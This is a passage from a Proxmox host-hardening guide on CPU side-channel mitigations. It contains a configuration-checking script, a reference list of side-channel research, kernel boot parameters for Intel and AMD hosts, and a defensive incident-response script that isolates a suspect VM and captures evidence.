    echo "    SEV-ES: $(cat /sys/module/kvm_amd/parameters/sev_es 2>/dev/null || echo N/A)"
fi
echo ""

echo "=== 5. CPU Flags (mitigation-related) ==="
grep flags /proc/cpuinfo | head -1 | tr ' ' '\n' | \
    grep -E 'pcid|invpcid|ssbd|ibpb|ibrs|stibp|md_clear|flush_l1d|spec_ctrl|arch_cap' | \
    sort | sed 's/^/  /'
echo ""

echo "=== 6. Kernel Command Line ==="
echo "  $(cat /proc/cmdline)"
echo ""

echo "=== 7. Cache Allocation Technology (CAT) ==="
if [ -d /sys/fs/resctrl ]; then
    echo "  Available: YES"
    echo "  CLOSIDs: $(cat /sys/fs/resctrl/info/L3/num_closids 2>/dev/null)"
    echo "  CBM mask: $(cat /sys/fs/resctrl/info/L3/cbm_mask 2>/dev/null)"
    if ls /sys/fs/resctrl/*/schemata &>/dev/null 2>&1; then
        echo "  Active partitions:"
        for schema in /sys/fs/resctrl/*/schemata; do
            dir=$(dirname "$schema")
            printf "    %-20s %s\n" "$(basename $dir):" "$(cat $schema)"
        done
    fi
else
    echo "  Available: NO (CPU does not support RDT/CAT)"
fi
echo ""

echo "=== 8. Transparent Huge Pages ==="
echo "  Enabled: $(cat /sys/kernel/mm/transparent_hugepage/enabled)"
echo "  Defrag: $(cat /sys/kernel/mm/transparent_hugepage/defrag)"
echo ""

echo "=== 9. Core Scheduling ==="
if grep -q CONFIG_SCHED_CORE=y /boot/config-$(uname -r) 2>/dev/null; then
    echo "  Kernel support: YES"
else
    echo "  Kernel support: NO (CONFIG_SCHED_CORE not set)"
fi
echo ""

echo "=== 10. RECOMMENDATIONS ==="
# Check for issues
ISSUES=0
if [ "$(cat /sys/kernel/mm/ksm/run)" != "0" ]; then
    echo "  [!] KSM is active — disable for security-sensitive environments"
    ISSUES=$((ISSUES + 1))
fi
if [ "$(cat /sys/devices/system/cpu/smt/active)" = "1" ]; then
    echo "  [!] SMT is active — consider disabling or using core scheduling"
    ISSUES=$((ISSUES + 1))
fi
if [ -f /sys/module/kvm_intel/parameters/vmentry_l1d_flush ]; then
    if [ "$(cat /sys/module/kvm_intel/parameters/vmentry_l1d_flush)" != "always" ]; then
        echo "  [!] L1D flush not set to 'always' — enable for multi-tenant"
        ISSUES=$((ISSUES + 1))
    fi
fi
if ! grep -q "spectre_v2=on" /proc/cmdline; then
    echo "  [!] spectre_v2 not explicitly enabled in cmdline"
    ISSUES=$((ISSUES + 1))
fi
if [ "$ISSUES" -eq 0 ]; then
    echo "  All checked mitigations appear correctly configured."
fi
echo ""
echo "=== Verification complete ==="
```

---

## References and Further Reading

### Foundational Papers

1. Kocher, P. et al. (2019). "Spectre Attacks: Exploiting Speculative Execution." IEEE S&P.
2. Lipp, M. et al. (2018). "Meltdown: Reading Kernel Memory from User Space." USENIX Security.
3. Yarom, Y. & Falkner, K. (2014). "FLUSH+RELOAD: A High Resolution, Low Noise, L3 Cache Side-Channel Attack." USENIX Security.
4. Liu, F. et al. (2015). "Last-Level Cache Side-Channel Attacks are Practical." IEEE S&P.
5. Gruss, D. et al. (2016). "Flush+Flush: A Fast and Stealthy Cache Attack." DIMVA.
6. Schwarz, M. et al. (2019). "ZombieLoad: Cross-Privilege-Boundary Data Sampling." CCS.
7. Van Schaik, S. et al. (2019). "RIDL: Rogue In-Flight Data Load." IEEE S&P.
8. Van Bulck, J. et al. (2020). "LVI: Hijacking Transient Execution through Microarchitectural Load Value Injection." IEEE S&P.
9. Moghimi, D. (2023). "Downfall: Exploiting Speculative Data Gathering." USENIX Security.
10. Wikner, D. & Razavi, K. (2022). "RETBLEED: Arbitrary Speculative Code Execution with Return Instructions." USENIX Security.

### Vendor Documentation

11. Intel. "Affected Processors: Transient Execution Attacks & Related Security Issues." (Updated quarterly)
12. AMD. "AMD Product Security — Speculative Execution." (Updated quarterly)
13. Linux Kernel. Documentation/admin-guide/hw-vuln/ (per-vulnerability documentation)
14. AMD. "SEV-SNP — Strengthening VM Isolation with Integrity Protection and More." White Paper (2020).
15. Intel. "Intel Trust Domain Extensions." Architecture Specification (2023).

### Tools and Implementations

16. Mastik — Micro-Architectural Side-Channel Toolkit (https://cs.adelaide.edu.au/~yval/Mastik/)
17. CacheOut toolkit (https://cacheoutattack.com/)
18. Intel SGX-Step — precise single-stepping of SGX enclaves for research
19. AMD SEV Tool — attestation and management (https://github.com/AMDESE/sev-tool)

---

## Appendix A: Quick Reference — Kernel Parameters for Proxmox Production

```bash
# /etc/default/grub — SECURITY-HARDENED Proxmox VE host
# Copy-paste after reviewing per-CPU applicability

# For Intel Xeon (Skylake through Sapphire Rapids):
GRUB_CMDLINE_LINUX="spectre_v2=on spectre_v2_user=on pti=on \
  l1tf=full,force mds=full tsx_async_abort=full \
  mmio_stale_data=full spec_store_bypass_disable=on \
  gather_data_sampling=force retbleed=auto \
  kvm_intel.vmentry_l1d_flush=always"

# For AMD EPYC (Zen 1-4):
GRUB_CMDLINE_LINUX="spectre_v2=on spectre_v2_user=on pti=on \
  spec_store_bypass_disable=on spec_rstack_overflow=safe-ret \
  srso=auto kvm_amd.sev=1"

# Add to either if maximum security required:
# nosmt                          (disables hyperthreading — 20-30% throughput loss)
# tsx=off                        (disable TSX entirely on Intel)

# After editing:
update-grub
reboot
```

## Appendix B: Emergency Response — Suspected Side-Channel Attack

```bash
#!/bin/bash
# emergency_response_side_channel.sh
# Run on Proxmox host when a side-channel attack is suspected

echo "=== EMERGENCY: Side-Channel Attack Response ==="
echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"

# 1. Immediately isolate suspected attacker VM
SUSPECT_VMID=${1:-""}
if [ -n "$SUSPECT_VMID" ]; then
    echo "[1] Pausing suspected VM $SUSPECT_VMID..."
    qm suspend "$SUSPECT_VMID" --todisk 2>/dev/null || \
    qm stop "$SUSPECT_VMID"
fi

# 2. Capture evidence (performance counters snapshot)
echo "[2] Capturing performance counter snapshot..."
perf stat -a -e cache-misses,cache-references,LLC-load-misses,\
branch-misses,branches --timeout 5000 2>&1 | tee /root/perf_snapshot_$(date +%s).log

# 3. Disable KSM immediately
echo "[3] Disabling KSM..."
echo 0 > /sys/kernel/mm/ksm/run

# 4. Enable maximum isolation
echo "[4] Enabling L1D flush (if Intel)..."
echo "always" > /sys/module/kvm_intel/parameters/vmentry_l1d_flush 2>/dev/null

# 5. Snapshot running VM state for forensics
echo "[5] Capturing VM process info..."
for pid in $(pgrep -f "qemu-system"); do
    echo "  PID $pid: $(cat /proc/$pid/cmdline | tr '\0' ' ')" >> /root/vm_processes_$(date +%s).log
    cat /proc/$pid/status >> /root/vm_processes_$(date +%s).log
    echo "---" >> /root/vm_processes_$(date +%s).log
done

# 6. Check for anomalous processes
echo "[6] Checking for unusual processes..."
ps aux --sort=-pcpu | head -20

echo ""
echo "=== Immediate actions complete ==="
echo "Next steps:"
echo "  1. Analyze captured perf data for attack signatures"
echo "  2. Review suspected VM's disk image for attack tools"
echo "  3. Check if sensitive VM cryptographic keys need rotation"
echo "  4. Migrate sensitive VMs to a different physical host"
echo "  5. Apply full mitigations before resuming multi-tenant operation"
echo "  6. Report incident per organizational IR procedures"
```
